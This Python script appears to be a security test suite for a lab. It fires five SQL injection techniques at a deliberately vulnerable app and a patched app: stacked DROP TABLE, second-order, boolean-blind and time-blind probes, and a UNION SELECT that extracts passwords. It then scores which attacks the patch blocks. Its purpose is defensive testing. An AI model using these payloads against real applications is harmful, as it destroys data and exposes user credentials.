#!/usr/bin/env python3
"""
Advanced SQL Injection Test Script
Tests all advanced SQL injection techniques against vulnerable and patched applications
"""

import requests
import sys
import time
from urllib.parse import urlencode

def test_stacked_statements(base_url):
    """Test stacked statements SQL injection"""
    print("\n=== Testing Stacked Statements SQL Injection ===")

    # First, login to get session
    session = requests.Session()
    login_data = {'username': 'alice', 'password': 'password123'}
    session.post(f"{base_url}/api/login", data=login_data)

    # Test payload: Try to drop a table
    payload = "alice'; DROP TABLE users; --"
    test_data = {'username': payload}

    print(f"[*] Payload: {payload}")
    response = session.post(f"{base_url}/api/bulk_delete", data=test_data)
    result = response.json()

    print(f"[*] Status Code: {response.status_code}")
    print(f"[*] Response: {result}")

    if result.get('success'):
        print("[!] VULNERABLE: Stacked statement executed!")
        if 'query' in result:
            print(f"[!] Exposed Query: {result['query']}")
        return True
    else:
        print("[+] SECURE: Stacked statement blocked")
        return False

def test_second_order_sqli(base_url):
    """Test second-order SQL injection"""
    print("\n=== Testing Second-Order SQL Injection ===")

    session = requests.Session()
    login_data = {'username': 'alice', 'password': 'password123'}
    session.post(f"{base_url}/api/login", data=login_data)

    # Stage 1: Save malicious payload
    malicious_display_name = "admin' OR '1'='1' --"
    preference_data = {
        'display_name': malicious_display_name,
        'theme': 'dark'
    }

    print(f"[*] Stage 1 - Saving malicious display name: {malicious_display_name}")
    response = session.post(f"{base_url}/api/save_preference", data=preference_data)
    print(f"[*] Save Response: {response.json()}")

    # Stage 2: Trigger the stored payload
    print(f"[*] Stage 2 - Retrieving user stats (triggers stored payload)")
    response = session.get(f"{base_url}/api/get_user_stats")
    result = response.json()

    print(f"[*] Status Code: {response.status_code}")
    print(f"[*] Response: {result}")

    if result.get('success') and result.get('stats', {}).get('user_count', 0) > 1:
        print("[!] VULNERABLE: Second-order SQL injection successful!")
        print(f"[!] Retrieved {result['stats']['user_count']} users instead of 1")
        if 'query' in result:
            print(f"[!] Executed Query: {result['query']}")
        return True
    else:
        print("[+] SECURE: Second-order SQL injection prevented")
        return False

def test_boolean_blind_sqli(base_url):
    """Test boolean-based blind SQL injection"""
    print("\n=== Testing Boolean-Based Blind SQL Injection ===")

    # Test TRUE condition
    payload_true = "admin' AND '1'='1"
    print(f"[*] Testing TRUE condition: {payload_true}")

    response_true = requests.get(f"{base_url}/api/check_username",
                                  params={'username': payload_true})
    result_true = response_true.json()

    # Test FALSE condition
    payload_false = "admin' AND '1'='2"
    print(f"[*] Testing FALSE condition: {payload_false}")

    response_false = requests.get(f"{base_url}/api/check_username",
                                   params={'username': payload_false})
    result_false = response_false.json()

    print(f"[*] TRUE Response: {result_true.get('available')}")
    print(f"[*] FALSE Response: {result_false.get('available')}")

    # If responses are different, injection is possible
    if result_true.get('available') != result_false.get('available'):
        print("[!] VULNERABLE: Boolean-based blind SQL injection possible!")
        print("[!] Different responses for TRUE/FALSE conditions allow data extraction")
        if 'query' in result_true:
            print(f"[!] Example Query: {result_true['query']}")
        return True
    else:
        print("[+] SECURE: Boolean-based blind SQL injection prevented")
        return False

def test_time_based_blind_sqli(base_url):
    """Test time-based blind SQL injection"""
    print("\n=== Testing Time-Based Blind SQL Injection ===")

    # Normal query (should be fast)
    payload_normal = "admin"
    print(f"[*] Testing normal query: {payload_normal}")

    start = time.time()
    response_normal = requests.get(f"{base_url}/api/verify_user",
                                    params={'username': payload_normal},
                                    timeout=10)
    normal_time = time.time() - start

    # Injection payload (should cause delay if vulnerable)
    payload_delay = "' OR (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) --"
    print(f"[*] Testing delay injection: {payload_delay}")

    try:
        start = time.time()
        response_delay = requests.get(f"{base_url}/api/verify_user",
                                       params={'username': payload_delay},
                                       timeout=10)
        delay_time = time.time() - start
    except requests.exceptions.Timeout:
        print("[!] VULNERABLE: Query timed out (time-based blind SQL injection possible)")
        return True

    print(f"[*] Normal query time: {normal_time:.3f}s")
    print(f"[*] Injection query time: {delay_time:.3f}s")

    # If delay is significantly longer, injection works
    if delay_time > normal_time * 2:
        print(f"[!] VULNERABLE: Time-based blind SQL injection successful!")
        print(f"[!] Delay: {delay_time - normal_time:.3f}s")
        return True
    else:
        print("[+] SECURE: Time-based blind SQL injection prevented")
        return False

def test_union_based_extraction(base_url):
    """Test UNION-based data extraction"""
    print("\n=== Testing UNION-Based Data Extraction ===")

    session = requests.Session()
    login_data = {'username': 'alice', 'password': 'password123'}
    session.post(f"{base_url}/api/login", data=login_data)

    # Test UNION SELECT payload
    payload = "' UNION SELECT id, username, password, email FROM users --"
    print(f"[*] Payload: {payload}")

    response = session.get(f"{base_url}/api/search", params={'query': payload})
    result = response.json()

    print(f"[*] Status Code: {response.status_code}")
    print(f"[*] Results count: {len(result.get('results', []))}")

    # Check if we got more data than expected
    if result.get('success') and len(result.get('results', [])) > 0:
        # Check if passwords are exposed
        has_passwords = any('password' in str(row) for row in result.get('results', []))

        print(f"[*] Sample result: {result.get('results', [])[0] if result.get('results') else 'None'}")

        if has_passwords or len(result.get('results', [])) >= 4:
            print("[!] VULNERABLE: UNION-based extraction successful!")
            print(f"[!] Extracted {len(result['results'])} records")
            if 'query' in result:
                print(f"[!] Executed Query: {result['query']}")
            return True

    print("[+] SECURE: UNION-based extraction prevented")
    return False

def run_all_tests(vulnerable_url, patched_url):
    """Run all advanced SQL injection tests"""
    print("=" * 70)
    print("ADVANCED SQL INJECTION TEST SUITE")
    print("=" * 70)

    results = {
        'vulnerable': {},
        'patched': {}
    }

    # Test vulnerable application
    print("\n" + "=" * 70)
    print("TESTING VULNERABLE APPLICATION")
    print(f"URL: {vulnerable_url}")
    print("=" * 70)

    results['vulnerable']['stacked'] = test_stacked_statements(vulnerable_url)
    results['vulnerable']['second_order'] = test_second_order_sqli(vulnerable_url)
    results['vulnerable']['boolean_blind'] = test_boolean_blind_sqli(vulnerable_url)
    results['vulnerable']['time_blind'] = test_time_based_blind_sqli(vulnerable_url)
    results['vulnerable']['union'] = test_union_based_extraction(vulnerable_url)

    # Test patched application
    print("\n" + "=" * 70)
    print("TESTING PATCHED APPLICATION")
    print(f"URL: {patched_url}")
    print("=" * 70)

    results['patched']['stacked'] = test_stacked_statements(patched_url)
    results['patched']['second_order'] = test_second_order_sqli(patched_url)
    results['patched']['boolean_blind'] = test_boolean_blind_sqli(patched_url)
    results['patched']['time_blind'] = test_time_based_blind_sqli(patched_url)
    results['patched']['union'] = test_union_based_extraction(patched_url)

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    print("\nVulnerable Application:")
    for test, vulnerable in results['vulnerable'].items():
        status = "VULNERABLE ✗" if vulnerable else "SECURE ✓"
        print(f"  {test.replace('_', ' ').title()}: {status}")

    print("\nPatched Application:")
    for test, vulnerable in results['patched'].items():
        status = "VULNERABLE ✗" if vulnerable else "SECURE ✓"
        print(f"  {test.replace('_', ' ').title()}: {status}")

    # Calculate statistics
    vuln_count = sum(results['vulnerable'].values())
    patched_count = sum(results['patched'].values())

    print(f"\nVulnerable App: {vuln_count}/5 vulnerabilities found")
    print(f"Patched App: {patched_count}/5 vulnerabilities found")
    print(f"\nEffectiveness: {((5 - patched_count) / 5 * 100):.0f}% of attacks blocked in patched version")

    return results

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 test_advanced_sqli.py <vulnerable_url> <patched_url>")
        print("Example: python3 test_advanced_sqli.py http://localhost:5000 http://localhost:5001")
        sys.exit(1)

    vulnerable_url = sys.argv[1].rstrip('/')
    patched_url = sys.argv[2].rstrip('/')

    run_all_tests(vulnerable_url, patched_url)
